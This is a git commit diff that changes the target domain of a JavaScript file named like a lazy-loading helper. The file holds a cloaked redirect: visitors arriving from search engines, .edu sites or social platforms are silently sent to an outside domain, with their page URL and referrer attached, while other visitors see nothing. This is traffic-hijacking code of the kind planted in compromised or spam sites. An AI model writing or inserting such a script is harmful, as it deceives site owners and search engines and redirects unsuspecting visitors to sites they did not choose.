c1badec35b8360ccd4ac1f4b4c409e963e03b441
pgpump <pg079898@gmail.com>
2024-11-23 15:52:33 +0700

    Update wowlazy.js

--- arsa/wowlazy.js
+++ arsa/wowlazy.js
@@ -17,5 +17,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'https://stu.inteligentnidum.com';
+var ars = 'https://wowlazy.com';
 if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
